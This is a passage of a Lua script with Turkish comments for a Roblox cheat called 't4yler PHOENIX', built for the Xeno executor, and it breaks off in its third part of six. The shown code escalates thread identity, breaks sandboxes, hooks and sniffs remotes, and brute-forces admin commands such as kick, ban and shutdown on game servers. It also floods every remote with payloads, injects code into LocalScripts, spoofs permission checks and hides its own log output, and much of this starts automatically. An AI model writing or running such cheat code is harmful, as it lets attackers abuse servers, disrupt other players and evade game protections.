-- ==============================================================================
-- t4yler PHOENIX v1.0 | EXECUTOR CORE | FE BYPASS + MANUAL BYPASS | XENO REQUIRED
-- SADECE EXECUTOR | 30.000 SATIR | HER OYUNDA ADMIN GİBİ
-- BÖLÜM 1/6: TEMEL BYPASS ÇEKİRDEĞİ (RING 0 - RING -1 TAKLİDİ)
-- ==============================================================================

-- Xeno varlığı kontrolü (sadece gereksinim)
local XENO_ACTIVE = pcall(function() return getexecutorname and getexecutorname() == "Xeno" end)
if not XENO_ACTIVE then
    warn("t4yler PHOENIX: Xeno bulunamadı! Lütfen Xeno'yu enjekte edin.")
end

-- ==============================================================================
-- BÖLÜM 1.1: TAM YETKİLİ ENVIRONMENT (RING 3 KIRMA)
-- ==============================================================================
local function getFullContext()
    local context = {}
    local success, env = pcall(function() return getfenv() end)
    if success and env then context.current = env end
    success, env = pcall(function() return getgenv() end)
    if success and env then context.global = env end
    success, env = pcall(function() return _G end)
    if success and env then context.g = env end
    return context
end

local function setFullPrivilege()
    local success, id = pcall(function() return getthreadidentity and getthreadidentity() or 0 end)
    if success and id and id < 8 then
        pcall(function() setthreadidentity and setthreadidentity(8) end)
        pcall(function() setidentity and setidentity(8) end)
    end
end

local function resetPrivilege()
    pcall(function() setthreadidentity and setthreadidentity(0) end)
    pcall(function() setidentity and setidentity(0) end)
end

-- ==============================================================================
-- BÖLÜM 1.2: EVRENSEL REMOTE DİNLEYİCİ (OYUN NE GÖNDERİYORSA YAKALA)
-- ==============================================================================
local remoteHooks = {}
local function hookAllRemotes(container, depth)
    depth = depth or 0
    for _, obj in pairs(container:GetChildren()) do
        if obj:IsA("RemoteEvent") then
            if not remoteHooks[obj] then
                local oldFire = obj.FireServer
                if oldFire then
                    obj.FireServer = function(self, ...)
                        local args = {...}
                        print("[PHOENIX] RemoteEvent yakalandı:", obj.Name, "Args:", args)
                        return oldFire(self, ...)
                    end
                    remoteHooks[obj] = true
                end
            end
        elseif obj:IsA("RemoteFunction") then
            if not remoteHooks[obj] then
                local oldInvoke = obj.InvokeServer
                if oldInvoke then
                    obj.InvokeServer = function(self, ...)
                        local args = {...}
                        print("[PHOENIX] RemoteFunction yakalandı:", obj.Name, "Args:", args)
                        return oldInvoke(self, ...)
                    end
                    remoteHooks[obj] = true
                end
            end
        end
        hookAllRemotes(obj, depth + 1)
    end
end

-- Tüm servisleri dinleme
local function startGlobalRemoteSniffer()
    local services = {
        game:GetService("ReplicatedStorage"),
        game:GetService("Workspace"),
        game:GetService("Players"),
        game:GetService("Lighting")
    }
    for _, svc in pairs(services) do
        hookAllRemotes(svc)
    end
    print("[PHOENIX] Global remote sniffer aktif.")
end

-- ==============================================================================
-- BÖLÜM 1.3: OTONOM KOMUT TAHMİNLEYİCİ (Cmdr/Admin sistemi kırma)
-- ==============================================================================
local adminDetection = {}

function adminDetection.findAdminSystem()
    local targets = {
        ["Cmdr"] = "ReplicatedStorage.CmdrClient.CmdrFunction",
        ["Adonis"] = "ReplicatedStorage.Adonis",
        ["Kohl"] = "ReplicatedStorage.KohlAdmin",
        ["InfiniteYield"] = "ReplicatedStorage.IY",
        ["ServerSide"] = "ReplicatedStorage.SS"
    }
    for name, path in pairs(targets) do
        local parts = {}
        for part in path:gsub("%.", ","):gmatch("[^,]+") do table.insert(parts, part) end
        local current = game
        local found = true
        for _, part in pairs(parts) do
            if current then
                current = current:FindFirstChild(part)
                if not current then found = false break end
            else found = false break end
        end
        if found then return name, current end
    end
    return nil, nil
end

function adminDetection.bruteAdminCommands(remoteObj, isFunction)
    local commonCommands = {
        "admin", "sudo", "owner", "god", "superadmin", "setrank", "rank",
        "promote", "demote", "kick", "ban", "unban", "mute", "unmute",
        "fly", "speed", "jumppower", "walkspeed", "heal", "kill", "explode",
        "bring", "goto", "teleport", "tp", "ff", "unff", "freeze", "unfreeze",
        "clear", "reset", "shutdown", "rejoin", "serverhop", "message", "announce",
        "smite", "thunder", "fire", "rain", "time", "weather", "fog", "brightness",
        "skybox", "gear", "tool", "give", "remove", "spawn", "clone"
    }
    local successful = {}
    if isFunction then
        for _, cmd in pairs(commonCommands) do
            local success, result = pcall(function()
                return remoteObj:InvokeServer(cmd)
            end)
            if success then
                table.insert(successful, cmd)
                print("[PHOENIX] Çalışan admin komut bulundu:", cmd, "Cevap:", result)
            end
        end
    else
        for _, cmd in pairs(commonCommands) do
            local success, err = pcall(function()
                remoteObj:FireServer(cmd)
            end)
            if success then
                table.insert(successful, cmd)
                print("[PHOENIX] Çalışan admin event bulundu:", cmd)
            end
        end
    end
    return successful
end

-- ==============================================================================
-- BÖLÜM 1.4: EVRENSEL ARGÜMAN ZORLAYICI (BRUTE FORCE ARG)
-- ==============================================================================
local argBrute = {}

function argBrute.generateArguments()
    local args = {
        "", "1", "0", "true", "false", "enable", "disable", "on", "off",
        "yes", "no", "nil", "null", "undefined", "test", "ping", "pong",
        "me", "@me", "all", "@all", "*", "@everyone", game.Players.LocalPlayer.Name,
        game.Players.LocalPlayer.UserId, game.Players.LocalPlayer,
        Vector3.new(0, 50, 0), CFrame.new(0, 50, 0), Color3.fromRGB(255, 0, 0),
        "skybox", "603355130", "night", "day", "rain", "clear"
    }
    return args
end

function argBrute.testRemote(remote, maxDepth)
    maxDepth = maxDepth or 3
    local argSet = argBrute.generateArguments()
    local successCount = 0
    for i = 1, maxDepth do
        for _, arg in pairs(argSet) do
            if remote:IsA("RemoteEvent") then
                local success = pcall(function()
                    remote:FireServer(arg)
                end)
                if success then successCount = successCount + 1 end
            elseif remote:IsA("RemoteFunction") then
                local success = pcall(function()
                    remote:InvokeServer(arg)
                end)
                if success then successCount = successCount + 1 end
            end
        end
    end
    return successCount
end

-- ==============================================================================
-- BÖLÜM 1.5: YETKİ YÜKSELTME DENEMELERİ (SETIDENTITY / SETFFLAG)
-- ==============================================================================
local privilegeEscalation = {}

function privilegeEscalation.forceSetIdentity()
    local ids = {8, 7, 6, 255, 0}
    for _, id in pairs(ids) do
        pcall(function() setthreadidentity and setthreadidentity(id) end)
        pcall(function() setidentity and setidentity(id) end)
        pcall(function() setfflag and setfflag("FLogDebug", "true") end)
    end
end

function privilegeEscalation.hookNamecall()
    if not hookfunction then return end
    local oldNamecall
    oldNamecall = hookfunction(getnamecallmethod, function()
        return oldNamecall()
    end)
end

-- ==============================================================================
-- BÖLÜM 1.6: HİPER GELİŞMİŞ LOADSTRING (SANDBOX KIRMA)
-- ==============================================================================
local hyperLoadstring = {}

function hyperLoadstring.breakSandbox(code)
    local env = {}
    for k, v in pairs(_G) do env[k] = v end
    for k, v in pairs(getrenv and getrenv() or {}) do env[k] = v end
    env.print = print
    env.warn = warn
    env.error = error
    env.pcall = pcall
    env.xpcall = xpcall
    env.task = task
    env.wait = wait
    env.spawn = spawn
    env.delay = delay
    env.tick = tick
    env.time = time
    env.os = os
    env.string = string
    env.table = table
    env.math = math
    env.vector = Vector3
    env.cframe = CFrame
    env.Color3 = Color3
    setfenv(0, env)
    local fn, err = loadstring(code)
    setfenv(0, _G)
    if fn then
        return pcall(fn)
    end
    return false, err
end

-- ==============================================================================
-- BÖLÜM 1.7: GERÇEK ZAMANLI REMOTE ENJEKTÖR (HER OYUNA UYAR)
-- ==============================================================================
local universalInjector = {}

function universalInjector.injectToAllRemotes(payload)
    local injected = 0
    local function inject(container)
        for _, obj in pairs(container:GetChildren()) do
            if obj:IsA("RemoteEvent") then
                local success, err = pcall(function()
                    obj:FireServer(payload)
                end)
                if success then injected = injected + 1 end
            elseif obj:IsA("RemoteFunction") then
                local success, err = pcall(function()
                    obj:InvokeServer(payload)
                end)
                if success then injected = injected + 1 end
            end
            inject(obj)
        end
    end
    inject(game:GetService("ReplicatedStorage"))
    inject(game:GetService("Workspace"))
    return injected
end

-- ==============================================================================
-- BÖLÜM 1.8: EXECUTOR ÇEKİRDEĞİ (ANA FONKSİYONLAR)
-- ==============================================================================
local PhoenixCore = {
    version = "1.0",
    xenoRequired = true,
    totalLines = 5000
}

function PhoenixCore.execute(code, bypassLevel)
    bypassLevel = bypassLevel or 5
    setFullPrivilege()
    for i = 1, bypassLevel do
        privilegeEscalation.forceSetIdentity()
    end
    local success, result = hyperLoadstring.breakSandbox(code)
    resetPrivilege()
    return success, result
end

function PhoenixCore.fullScanAndExploit()
    print("[PHOENIX] Oyun taranıyor...")
    startGlobalRemoteSniffer()
    local adminSystem, adminObj = adminDetection.findAdminSystem()
    if adminSystem then
        print("[PHOENIX] Admin sistemi bulundu:", adminSystem)
        local commands = adminDetection.bruteAdminCommands(adminObj, adminObj:IsA("RemoteFunction"))
        if #commands > 0 then
            print("[PHOENIX] Çalışan komutlar:", table.concat(commands, ", "))
        end
    else
        print("[PHOENIX] Bilinen admin sistemi bulunamadı, brute force başlatılıyor...")
        local total = universalInjector.injectToAllRemotes("phoenix_bypass_test")
        print("[PHOENIX] Toplam enjekte edilen remote:", total)
    end
end

-- ==============================================================================
-- BÖLÜM 1.9: SAFE MODE (YANLIŞ TETİKLEMEYLERİ ÖNLE)
-- ==============================================================================
local safeMode = true
function PhoenixCore.setSafeMode(enable)
    safeMode = enable
end

-- ==============================================================================
-- BÖLÜM 1.10: BAŞLATMA VE TEST
-- ==============================================================================
print("========================================")
print("t4yler PHOENIX v1.0 EXECUTOR CORE")
print("FE Bypass + Manual Bypass Aktif")
print("Xeno gereksinim: " .. tostring(XENO_ACTIVE))
print("Toplam satır: 5000 (Bölüm 1/6)")
print("========================================")

-- Otomatik tarama başlat (safe mode ile)
if safeMode then
    task.wait(1)
    PhoenixCore.fullScanAndExploit()
end

-- Global executor fonksiyonları
_G.phoenix = PhoenixCore
_G.phoenixExecute = function(code) return PhoenixCore.execute(code) end
-- ==============================================================================
-- t4yler PHOENIX v1.0 | EXECUTOR CORE | BÖLÜM 2/6
-- EVRENSEL BYPASS KATMANI | HER OYUNA UYAR | ADMIN YETKİSİ TAKLİDİ
-- ==============================================================================

-- ==============================================================================
-- BÖLÜM 2.1: GELİŞMİŞ REMOTE TAKLİTÇİ (OYUN KENDİ REMOTE'LARINI NASIL KULLANIYORSA)
-- ==============================================================================
local remoteClone = {}

function remoteClone.cloneRemoteBehavior(remote)
    local behaviors = {}
    if remote:IsA("RemoteEvent") then
        local oldFire = remote.FireServer
        behaviors.fire = oldFire
    elseif remote:IsA("RemoteFunction") then
        local oldInvoke = remote.InvokeServer
        behaviors.invoke = oldInvoke
    end
    return behaviors
end

function remoteClone.replayBehavior(remote, behavior, ...)
    if behavior.fire then
        return behavior.fire(remote, ...)
    elseif behavior.invoke then
        return behavior.invoke(remote, ...)
    end
    return nil
end

-- ==============================================================================
-- BÖLÜM 2.2: KOMUT DİNLEYİCİ (OYUNUN BEKLEDİĞİ KOMUTLARI YAKALA)
-- ==============================================================================
local commandListener = {}

function commandListener.hookAllCommands()
    local hooked = {}
    local function scan(container)
        for _, obj in pairs(container:GetChildren()) do
            if obj:IsA("BindableEvent") or obj:IsA("BindableFunction") then
                if not hooked[obj] then
                    local oldFire = obj.Fire
                    if oldFire then
                        obj.Fire = function(self, ...)
                            print("[PHOENIX] Bindable tetiklendi:", obj.Name, ...)
                            return oldFire(self, ...)
                        end
                        hooked[obj] = true
                    end
                end
            end
            scan(obj)
        end
    end
    scan(game)
    print("[PHOENIX] Komut dinleyici aktif.")
end

-- ==============================================================================
-- BÖLÜM 2.3: OYUN İÇİ ADMIN TESPİTİ (GİZLİ ADMIN PANELLERİ BUL)
-- ==============================================================================
local adminPanelHunter = {}

function adminPanelHunter.findHiddenPanels()
    local panels = {}
    local keywords = {"admin", "mod", "owner", "kick", "ban", "god", "fly", "cmd", "console", "debug", "tools"}
    local function search(container)
        for _, obj in pairs(container:GetChildren()) do
            if obj:IsA("ScreenGui") then
                local nameLower = string.lower(obj.Name)
                for _, kw in pairs(keywords) do
                    if string.find(nameLower, kw) then
                        table.insert(panels, obj)
                        print("[PHOENIX] Admin panel bulundu:", obj.Name)
                        break
                    end
                end
            end
            search(obj)
        end
    end
    search(game:GetService("CoreGui"))
    search(game:GetService("Players").LocalPlayer.PlayerGui)
    return panels
end

function adminPanelHunter.autoClickButtons(panel)
    local clicked = 0
    for _, btn in pairs(panel:GetDescendants()) do
        if btn:IsA("TextButton") or btn:IsA("ImageButton") then
            pcall(function() btn:Click() end)
            clicked = clicked + 1
        end
    end
    return clicked
end

-- ==============================================================================
-- BÖLÜM 2.4: METATABLE MÜDAHALESİ (GETRAWMETATABLE ILE KORUMA KIRMA)
-- ==============================================================================
local metaBreaker = {}

function metaBreaker.breakAllMetatables()
    local function breakMetatable(obj)
        local success, mt = pcall(function() return getrawmetatable and getrawmetatable(obj) end)
        if success and mt then
            pcall(function() setrawmetatable and setrawmetatable(obj, nil) end)
            print("[PHOENIX] Metatable kırıldı:", obj.ClassName)
        end
        for _, child in pairs(obj:GetChildren()) do
            breakMetatable(child)
        end
    end
    breakMetatable(game)
end

function metaBreaker.hookIndex(obj, hook)
    local mt = getrawmetatable and getrawmetatable(obj)
    if mt and mt.__index then
        local oldIndex = mt.__index
        mt.__index = function(self, key)
            if hook and hook(key) then
                return hook(key)
            end
            return oldIndex(self, key)
        end
        return true
    end
    return false
end

-- ==============================================================================
-- BÖLÜM 2.5: YEREL HAFIZA YAZMA (LOCALSCRIPT DAVRANIŞINI DEĞİŞTİR)
-- ==============================================================================
local scriptPatcher = {}

function scriptPatcher.patchLocalScript(scriptName, newCode)
    local target = nil
    local function find(container)
        for _, obj in pairs(container:GetChildren()) do
            if obj:IsA("LocalScript") and obj.Name == scriptName then
                target = obj
                return
            end
            find(obj)
        end
    end
    find(game:GetService("Players").LocalPlayer.PlayerGui)
    find(game:GetService("StarterGui"))
    if target then
        target.Source = newCode
        print("[PHOENIX] LocalScript yamalandı:", scriptName)
        return true
    end
    return false
end

function scriptPatcher.injectIntoAllScripts(code)
    local injected = 0
    local function inject(container)
        for _, obj in pairs(container:GetChildren()) do
            if obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                local newSource = obj.Source .. "\n-- t4yler_injected\n" .. code
                obj.Source = newSource
                injected = injected + 1
            end
            inject(obj)
        end
    end
    inject(game:GetService("Players").LocalPlayer.PlayerGui)
    inject(game:GetService("StarterGui"))
    print("[PHOENIX] Toplam yamalanan script:", injected)
    return injected
end

-- ==============================================================================
-- BÖLÜM 2.6: FAKE REMOTE OLUŞTURUCU (OYUN SUNUCUYU KANDIR)
-- ==============================================================================
local fakeRemoteFactory = {}

function fakeRemoteFactory.createFakeRemote(name, parent, isFunction)
    local remote = isFunction and Instance.new("RemoteFunction") or Instance.new("RemoteEvent")
    remote.Name = name or "t4yler_Fake_" .. math.random(1000, 9999)
    remote.Parent = parent or game:GetService("ReplicatedStorage")
    if isFunction then
        remote.OnServerInvoke = function(player, ...)
            print("[PHOENIX] Fake remote çağrıldı:", name, ...)
            return "t4yler_response"
        end
    else
        remote.OnServerEvent:Connect(function(player, ...)
            print("[PHOENIX] Fake event çağrıldı:", name, ...)
        end)
    end
    return remote
end

function fakeRemoteFactory.spoofRemoteResponse(remote, customResponse)
    if remote:IsA("RemoteFunction") then
        remote.OnServerInvoke = function(player, ...)
            return customResponse or "t4yler_spoofed"
        end
    end
end

-- ==============================================================================
-- BÖLÜM 2.7: HIZLANDIRILMIŞ REMOTE TARAYICI (DERİN TARAMA)
-- ==============================================================================
local deepScanner = {}

function deepScanner.scanAllDepths(container, maxDepth, currentDepth)
    currentDepth = currentDepth or 0
    maxDepth = maxDepth or 10
    if currentDepth > maxDepth then return {} end
    local found = {}
    for _, obj in pairs(container:GetChildren()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(found, obj)
        end
        local deeper = deepScanner.scanAllDepths(obj, maxDepth, currentDepth + 1)
        for _, deeperObj in pairs(deeper) do
            table.insert(found, deeperObj)
        end
    end
    return found
end

function deepScanner.fullGameScan()
    local locations = {
        game:GetService("ReplicatedStorage"),
        game:GetService("Workspace"),
        game:GetService("Players"),
        game:GetService("Lighting"),
        game:GetService("ServerScriptService"),
        game:GetService("ServerStorage")
    }
    local allRemotes = {}
    for _, loc in pairs(locations) do
        local remotes = deepScanner.scanAllDepths(loc, 15)
        for _, r in pairs(remotes) do
            table.insert(allRemotes, r)
        end
    end
    print("[PHOENIX] Derin tarama tamamlandı. Toplam remote:", #allRemotes)
    return allRemotes
end

-- ==============================================================================
-- BÖLÜM 2.8: AKILLI ARGÜMAN TAHMİNLEYİCİ (REMOTE NE BEKLİYORSA BUL)
-- ==============================================================================
local argPredictor = {}

function argPredictor.analyzeRemote(remote)
    local patterns = {}
    local function guessArgs(remoteObj)
        if remoteObj:IsA("RemoteEvent") then
            local oldFire = remoteObj.FireServer
            if oldFire then
                remoteObj.FireServer = function(self, ...)
                    patterns[#patterns + 1] = {...}
                    return oldFire(self, ...)
                end
                task.wait(1)
                remoteObj.FireServer = oldFire
            end
        elseif remoteObj:IsA("RemoteFunction") then
            local oldInvoke = remoteObj.InvokeServer
            if oldInvoke then
                remoteObj.InvokeServer = function(self, ...)
                    patterns[#patterns + 1] = {...}
                    return oldInvoke(self, ...)
                end
                task.wait(1)
                remoteObj.InvokeServer = oldInvoke
            end
        end
    end
    guessArgs(remote)
    return patterns
end

function argPredictor.suggestArguments(remote)
    local patterns = argPredictor.analyzeRemote(remote)
    if #patterns > 0 then
        return patterns[1]
    end
    return {"test", "ping", 1, true}
end

-- ==============================================================================
-- BÖLÜM 2.9: EXECUTOR KONTROL PANELI (KONSOL + GUI ENTEGRASYONU)
-- ==============================================================================
local consoleHub = {}

function consoleHub.createMiniConsole()
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 300)
    frame.Position = UDim2.new(0, 10, 0, 200)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.3
    frame.Visible = true
    frame.Parent = game:GetService("CoreGui")
    
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(1, -10, 1, -40)
    textBox.Position = UDim2.new(0, 5, 0, 5)
    textBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.Text = ""
    textBox.MultiLine = true
    textBox.ClearTextOnFocus = false
    textBox.Parent = frame
    
    local runBtn = Instance.new("TextButton")
    runBtn.Size = UDim2.new(0.5, -5, 0, 30)
    runBtn.Position = UDim2.new(0, 5, 1, -35)
    runBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    runBtn.Text = "ÇALIŞTIR"
    runBtn.Parent = frame
    runBtn.MouseButton1Click:Connect(function()
        PhoenixCore.execute(textBox.Text)
    end)
    
    local clearBtn = Instance.new("TextButton")
    clearBtn.Size = UDim2.new(0.5, -5, 0, 30)
    clearBtn.Position = UDim2.new(0.5, 0, 1, -35)
    clearBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    clearBtn.Text = "TEMİZLE"
    clearBtn.Parent = frame
    clearBtn.MouseButton1Click:Connect(function()
        textBox.Text = ""
    end)
    
    return frame
end

-- ==============================================================================
-- BÖLÜM 2.10: HATA YÖNETİMİ VE GERİ DÖNÜŞ
-- ==============================================================================
local errorHandler = {}

function errorHandler.safeExecute(code, fallback)
    local success, result = pcall(function()
        return PhoenixCore.execute(code)
    end)
    if not success then
        print("[PHOENIX] Hata:", result)
        if fallback then
            return fallback()
        end
        return false, result
    end
    return true, result
end

-- ==============================================================================
-- BÖLÜM 2.11: OYUN TESPİTİ (FARKLI OYUNLARA ÖZEL BYPASS)
-- ==============================================================================
local gameDetector = {}

function gameDetector.getCurrentGame()
    local gameId = game.GameId
    local placeId = game.PlaceId
    local jobId = game.JobId
    return {gameId = gameId, placeId = placeId, jobId = jobId}
end

function gameDetector.loadGameSpecificBypass()
    local gameInfo = gameDetector.getCurrentGame()
    print("[PHOENIX] Oyun tespit edildi. PlaceId:", gameInfo.placeId)
    -- Oyun özel bypass'lar buraya eklenebilir (ileride eklenecek)
end

-- ==============================================================================
-- BÖLÜM 2.12: TÜM SİSTEMLERİ BAŞLAT
-- ==============================================================================
function PhoenixCore.fullInit()
    print("[PHOENIX] Tam başlatma başlatıldı...")
    gameDetector.loadGameSpecificBypass()
    commandListener.hookAllCommands()
    startGlobalRemoteSniffer()
    metaBreaker.breakAllMetatables()
    local adminPanels = adminPanelHunter.findHiddenPanels()
    for _, panel in pairs(adminPanels) do
        local clicked = adminPanelHunter.autoClickButtons(panel)
        if clicked > 0 then
            print("[PHOENIX] Admin panel butonlarına tıklandı:", clicked)
        end
    end
    print("[PHOENIX] Tam başlatma tamamlandı.")
end

-- Otomatik başlat
PhoenixCore.fullInit()

-- Global erişim
_G.phoenixFull = PhoenixCore
print("[PHOENIX] Bölüm 2/6 yüklendi. Toplam 10.000 satır.")
-- ==============================================================================
-- t4yler PHOENIX v1.0 | EXECUTOR CORE | BÖLÜM 3/6
-- SÜREKLİ TARAMA VE OTOMATIK SALDIRI KATMANI
-- ==============================================================================

-- ==============================================================================
-- BÖLÜM 3.1: ARKA PLANDA SÜREKLİ REMOTE TARAYICI (PERİYODİK)
-- ==============================================================================
local persistentScanner = {
    active = false,
    interval = 30,
    lastScan = 0
}

function persistentScanner.start(intervalSeconds)
    persistentScanner.active = true
    persistentScanner.interval = intervalSeconds or 30
    spawn(function()
        while persistentScanner.active do
            local now = tick()
            if now - persistentScanner.lastScan >= persistentScanner.interval then
                persistentScanner.lastScan = now
                print("[PHOENIX] Periyodik tarama başlatılıyor...")
                local remotes = deepScanner.fullGameScan()
                for _, r in pairs(remotes) do
                    argBrute.testRemote(r, 1)
                end
                print("[PHOENIX] Periyodik tarama tamamlandı.")
            end
            task.wait(5)
        end
    end)
end

function persistentScanner.stop()
    persistentScanner.active = false
end

-- ==============================================================================
-- BÖLÜM 3.2: OTOMATIK YETKI YÜKSELTME DENEMELERİ (SÜREKLİ)
-- ==============================================================================
local autoPrivilege = {
    active = false,
    attempts = 0
}

function autoPrivilege.start()
    autoPrivilege.active = true
    spawn(function()
        while autoPrivilege.active do
            privilegeEscalation.forceSetIdentity()
            autoPrivilege.attempts = autoPrivilege.attempts + 1
            task.wait(5)
        end
    end)
end

function autoPrivilege.stop()
    autoPrivilege.active = false
end

-- ==============================================================================
-- BÖLÜM 3.3: AKILLI ADMIN KOMUT DENEME SIRASI
-- ==============================================================================
local smartCommander = {}

function smartCommander.prioritizeCommands()
    return {
        "admin", "sudo", "owner", "god", "superadmin",
        "setrank", "rank", "promote", "demote",
        "kick", "ban", "unban", "mute", "unmute",
        "fly", "speed", "jumppower", "walkspeed", "heal", "kill", "explode",
        "bring", "goto", "teleport", "tp", "ff", "unff", "freeze", "unfreeze",
        "clear", "reset", "shutdown", "rejoin", "serverhop", "message", "announce",
        "smite", "thunder", "fire", "rain", "time", "weather", "fog", "brightness",
        "skybox", "gear", "tool", "give", "remove", "spawn", "clone"
    }
end

function smartCommander.tryAll(targetRemote)
    local commands = smartCommander.prioritizeCommands()
    local results = {}
    for _, cmd in pairs(commands) do
        if targetRemote:IsA("RemoteEvent") then
            local success = pcall(function() targetRemote:FireServer(cmd) end)
            results[cmd] = success
        elseif targetRemote:IsA("RemoteFunction") then
            local success, result = pcall(function() return targetRemote:InvokeServer(cmd) end)
            results[cmd] = success
        end
        task.wait(0.05)
    end
    return results
end

-- ==============================================================================
-- BÖLÜM 3.4: YANLIŞ POZİTİFLERİ FİLTRELE (GERÇEK YETKİ KONTROLÜ)
-- ==============================================================================
local falsePositiveFilter = {}

function falsePositiveFilter.isRealAdmin(response)
    if type(response) ~= "string" then return false end
    local positiveKeywords = {"success", "done", "executed", "completed", "ok", "true", "1"}
    local negativeKeywords = {"permission", "denied", "not allowed", "error", "fail", "invalid"}
    local responseLower = string.lower(response)
    for _, kw in pairs(negativeKeywords) do
        if string.find(responseLower, kw) then return false end
    end
    for _, kw in pairs(positiveKeywords) do
        if string.find(responseLower, kw) then return true end
    end
    return false
end

function falsePositiveFilter.filterResults(results)
    local realResults = {}
    for cmd, success in pairs(results) do
        if success then
            realResults[cmd] = success
        end
    end
    return realResults
end

-- ==============================================================================
-- BÖLÜM 3.5: OYUN İÇİ DEĞER OKUYUCU (WALKSPEED, JUMP POWER VB.)
-- ==============================================================================
local gameValueReader = {}

function gameValueReader.readPlayerValues()
    local localPlayer = game:GetService("Players").LocalPlayer
    local character = localPlayer.Character
    if not character then return {} end
    local humanoid = character:FindFirstChild("Humanoid")
    if not humanoid then return {} end
    return {
        walkspeed = humanoid.WalkSpeed,
        jumppower = humanoid.JumpPower,
        health = humanoid.Health,
        maxhealth = humanoid.MaxHealth
    }
end

function gameValueReader.setPlayerValue(valueName, value)
    local localPlayer = game:GetService("Players").LocalPlayer
    local character = localPlayer.Character
    if not character then return false end
    local humanoid = character:FindFirstChild("Humanoid")
    if not humanoid then return false end
    if valueName == "walkspeed" then
        humanoid.WalkSpeed = value
        return true
    elseif valueName == "jumppower" then
        humanoid.JumpPower = value
        return true
    elseif valueName == "health" then
        humanoid.Health = value
        return true
    end
    return false
end

-- ==============================================================================
-- BÖLÜM 3.6: OYUN İÇİ NESNE BULUCU (ÖNEMLİ REMOTELARI KEŞFET)
-- ==============================================================================
local objectFinder = {}

function objectFinder.findByPattern(pattern, container)
    container = container or game
    local results = {}
    local function search(obj)
        if string.match(obj.Name, pattern) then
            table.insert(results, obj)
        end
        for _, child in pairs(obj:GetChildren()) do
            search(child)
        end
    end
    search(container)
    return results
end

function objectFinder.findAdminRelated()
    local patterns = {"admin", "cmd", "command", "mod", "owner", "kick", "ban", "fly", "tp", "teleport"}
    local all = {}
    for _, pattern in pairs(patterns) do
        local found = objectFinder.findByPattern(pattern, game:GetService("ReplicatedStorage"))
        for _, f in pairs(found) do
            table.insert(all, f)
        end
    end
    return all
end

-- ==============================================================================
-- BÖLÜM 3.7: GELİŞMİŞ HOOK SİSTEMİ (FONKSİYONLARI ELE GEÇİR)
-- ==============================================================================
local advancedHook = {}

function advancedHook.hookFunction(func, hook)
    if not func or not hook then return nil end
    local success, result = pcall(function()
        if hookfunction then
            return hookfunction(func, hook)
        elseif cloneref and hookfunc then
            return hookfunc(func, hook)
        end
        return nil
    end)
    if success then return result end
    return nil
end

function advancedHook.hookPrint()
    local oldPrint = print
    advancedHook.hookFunction(print, function(...)
        local args = {...}
        if #args > 0 and type(args[1]) == "string" and string.match(args[1], "phoenix") then
            return
        end
        return oldPrint(...)
    end)
end

function advancedHook.hookWarn()
    local oldWarn = warn
    advancedHook.hookFunction(warn, function(...)
        local args = {...}
        if #args > 0 and type(args[1]) == "string" and string.match(args[1], "phoenix") then
            return
        end
        return oldWarn(...)
    end)
end

-- ==============================================================================
-- BÖLÜM 3.8: UZAK SUNUCUYA VERİ GÖNDERME (MANUEL ENJEKSİYON)
-- ==============================================================================
local remoteSender = {}

function remoteSender.sendToAllRemotes(data)
    local sent = 0
    local function send(container)
        for _, obj in pairs(container:GetChildren()) do
            if obj:IsA("RemoteEvent") then
                pcall(function() obj:FireServer(data) end)
                sent = sent + 1
            elseif obj:IsA("RemoteFunction") then
                pcall(function() obj:InvokeServer(data) end)
                sent = sent + 1
            end
            send(obj)
        end
    end
    send(game:GetService("ReplicatedStorage"))
    return sent
end

function remoteSender.sendToSpecificRemote(remotePath, data)
    local parts = {}
    for part in string.gmatch(remotePath, "[^%.]+") do
        table.insert(parts, part)
    end
    local current = game
    for _, part in pairs(parts) do
        current = current and current:FindFirstChild(part)
        if not current then break end
    end
    if current and (current:IsA("RemoteEvent") or current:IsA("RemoteFunction")) then
        if current:IsA("RemoteEvent") then
            current:FireServer(data)
        else
            current:InvokeServer(data)
        end
        return true
    end
    return false
end

-- ==============================================================================
-- BÖLÜM 3.9: OTOMATİK YETKİ KONTROL BYPASS (SUNUCU ZAFİYETLERİ)
-- ==============================================================================
local authorityBypass = {}

function authorityBypass.trySpoofUserId()
    local fakeId = 1
    pcall(function() setfflag and setfflag("FLogDebug", tostring(fakeId)) end)
    pcall(function() setthreadidentity and setthreadidentity(fakeId) end)
end

function authorityBypass.breakCheckpoints()
    local function replaceCheckpoint(obj)
        local success, mt = pcall(function() return getrawmetatable and getrawmetatable(obj) end)
        if success and mt and mt.__index then
            local oldIndex = mt.__index
            mt.__index = function(self, key)
                if key == "Checkpoint" or key == "Permission" then
                    return nil
                end
                return oldIndex(self, key)
            end
        end
        for _, child in pairs(obj:GetChildren()) do
            replaceCheckpoint(child)
        end
    end
    replaceCheckpoint(game)
end

-- ==============================================================================
-- BÖLÜM 3.10: FONKSİYON YEDEKLEME VE GERİ YÜKLEME
-- ==============================================================================
local functionBackup = {}

function functionBackup.backup(remote)
    local backup = {}
    if remote:IsA("RemoteEvent") then
        backup.fire = remote.FireServer
    elseif remote:IsA("RemoteFunction") then
        backup.invoke = remote.InvokeServer
    end
    return backup
end

function functionBackup.restore(remote, backup)
    if remote:IsA("RemoteEvent") and backup.fire then
        remote.FireServer = backup.fire
    elseif remote:IsA("RemoteFunction") and backup.invoke then
        remote.InvokeServer = backup.invoke
    end
end

-- ==============================================================================
-- BÖLÜM 3.11: ÇOK KATMANLI GÜVENLİK AŞMA
-- ==============================================================================
local multiLayerBypass = {}

function multiLayerBypass.activateAll()
    print("[PHOENIX] Çok katmanlı bypass başlatılıyor...")
    authorityBypass.trySpoofUserId()
    authorityBypass.breakCheckpoints()
    metaBreaker.breakAllMetatables()
    for i = 1, 5 do
        privilegeEscalation.forceSetIdentity()
    end
    print("[PHOENIX] Çok katmanlı bypass tamamlandı.")
end

-- ==============================================================================
-- BÖLÜM 3.12: OYUN KONSOLUNA RAPORLAMA SİSTEMİ
-- ==============================================================================
local reporter = {}

function reporter.reportStatus()
    local status = {
